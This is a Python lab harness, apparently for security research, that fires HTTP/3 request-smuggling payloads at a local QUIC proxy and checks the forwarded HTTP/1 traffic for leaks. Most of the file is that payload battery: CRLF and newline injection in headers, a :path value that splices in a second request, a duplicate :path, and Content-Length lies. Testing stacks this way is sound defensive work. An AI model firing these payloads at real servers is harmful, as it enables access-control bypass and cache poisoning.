"""Portable H3->H1 downgrade + synthesis panel probe. Fire genomes over real H3 at a
stack's QUIC port; read the edge->origin tap (the forwarded H1). A smuggle = the stack
splices malformed QPACK bytes into H1 (marker leak / reqlines>1) or forwards a declared
Content-Length greater than the body it delivered (standalone-FIN CL-lie). SENTINEL
FIRST: benign frames exactly 1 clean H1. Marker = SMUGSYNTH.

usage: python h3_panel.py <udp_port> <tap_log_path>   (run from the lab dir)"""
import asyncio
import os
import ssl
import sys
import time

sys.path.insert(0, "/home/j4kuuu/Desktop/tools/Phage/src")
from aioquic.asyncio.client import connect
from aioquic.h3.connection import H3_ALPN, H3Connection
from aioquic.quic.configuration import QuicConfiguration

from phage.evo import genome as G
from phage.evo.driver import drive

PORT = int(sys.argv[1])
TAP = sys.argv[2]
CRLF = b"\r\n"


def size(p):
    try:
        return os.path.getsize(p)
    except OSError:
        return 0


async def _fire(genome, raw):
    cfg = QuicConfiguration(is_client=True, alpn_protocols=H3_ALPN)
    cfg.verify_mode = ssl.CERT_NONE
    async with connect("127.0.0.1", PORT, configuration=cfg) as client:
        http = H3Connection(client._quic)
        sid = client._quic.get_next_available_stream_id()
        await drive(http, client._quic, sid, genome, transmit=client.transmit, raw=raw)
        await asyncio.sleep(0.3)


def declared_delivered(fwd):
    head, sep, body = fwd.partition(CRLF + CRLF)
    if not sep:
        return None, 0
    cl = None
    for line in head.split(CRLF):
        if line.lower().startswith(b"content-length"):
            try:
                cl = int(line.split(b":", 1)[1].strip())
            except ValueError:
                cl = None
    return cl, len(body)


def fire(genome, label, raw=True):
    off = size(TAP)
    try:
        asyncio.new_event_loop().run_until_complete(_fire(genome, raw))
    except Exception:
        pass
    time.sleep(0.4)
    try:
        with open(TAP, "rb") as f:
            f.seek(off)
            fwd = f.read()
    except OSError:
        fwd = b""
    reqlines = fwd.count(b" HTTP/1.1" + CRLF)
    leaked = b"SMUGSYNTH" in fwd
    cl, body = declared_delivered(fwd)
    lie = cl is not None and cl > body
    flag = "  <<< SMUGGLE" if (leaked or reqlines > 1 or lie) else ""
    print(f"[{label}] fwd={len(fwd)}B reqlines={reqlines} marker={leaked} "
          f"cl={cl} body={body} cl>body={lie}{flag}")
    if fwd:
        print(f"    H1: {fwd[:160]!r}")
    return fwd, reqlines, leaked, lie


PRE = [(b":method", b"GET"), (b":scheme", b"https"), (b":authority", b"lab")]


def H(fields, end=True):
    return G.Headers(tuple(fields), end_stream=end)


if __name__ == "__main__":
    print(f"=== H3 panel: port {PORT} tap {TAP} ===")
    fwd, n, leak, _ = fire([H(PRE + [(b":path", b"/sentinel")])], "SENTINEL benign")
    if n != 1 or leak:
        print(f"SENTINEL FAIL (reqlines={n} leak={leak}). Channel not proven. Stop.")
        sys.exit(1)
    print("SENTINEL OK.")

    # Synthesis battery (raw QPACK field injection).
    fire([H(PRE + [(b":path", b"/crlf"), (b"x-inj", b"a\r\nX-SMUGSYNTH: 1\r\nFoo: b")])],
         "1 CRLF-in-header-value")
    fire([H(PRE + [(b":path",
            b"/a HTTP/1.1\r\nHost: evil\r\n\r\nGET /SMUGSYNTH HTTP/1.1\r\nHost: lab")])],
         "2 :path request-line injection")
    fire([H([(b":method", b"GET"), (b":scheme", b"https"),
            (b":authority", b"lab\r\nX-SMUGSYNTH: 1"), (b":path", b"/ac")])],
         "3 CRLF-in-authority")
    fire([H([(b":method", b"GET"), (b":scheme", b"https"), (b":authority", b"lab"),
            (b":path", b"/one"), (b":path", b"/SMUGSYNTH")])], "4 duplicate :path")
    fire([H(PRE + [(b":path", b"/nul"), (b"x-nul", b"a\x00b\rX-SMUGSYNTH: 1")])],
         "5 NUL/CR-in-value")
    fire([H(PRE + [(b":path", b"/lf"), (b"x-lf", b"a\nX-SMUGSYNTH: 1")])],
         "6 bare-LF-in-value")
    # Downgrade battery (CL-lie via standalone-FIN: HEADERS CL:10 no body, then FIN).
    fire([H([(b":method", b"POST"), (b":scheme", b"https"), (b":authority", b"lab"),
            (b":path", b"/fin"), (b"content-length", b"10")], end=False), G.Fin()],
         "7 standalone-FIN (CL:10, no body)")
    fire([H([(b":method", b"POST"), (b":scheme", b"https"), (b":authority", b"lab"),
            (b":path", b"/short"), (b"content-length", b"20")], end=False),
          G.Data(b"AAAA", end_stream=False), G.Fin()], "8 body-length-lie (CL:20, 4B)")
    print("VERDICT: any <<< SMUGGLE line above = a stack that forwarded malformed H1.")
